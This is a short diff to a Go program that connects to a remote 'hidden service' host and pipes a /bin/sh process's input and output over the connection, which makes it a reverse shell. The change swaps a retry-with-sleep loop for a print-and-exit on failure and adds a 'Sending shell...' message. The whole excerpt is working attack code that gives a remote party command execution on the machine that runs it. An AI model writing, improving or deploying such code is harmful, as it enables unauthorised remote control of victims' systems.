@@ -48,14 +48,13 @@ func main() {
 
 	// Connect to hidden service
 	c, err := dialer.Dial("tcp", host)
-	if nil != err {
-		if nil != c {
-			c.Close()
-		}
-		time.Sleep(time.Minute)
+	if err != nil {
+		fmt.Println("Failed to connect to " + host)
+		return
 	}
 	defer c.Close()
 
+	fmt.Println("Connected to " + host + ". Sending shell...")
 	// Piping std{in,out,err} to the connection and running shell
 	cmd := exec.Command("/bin/sh")
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
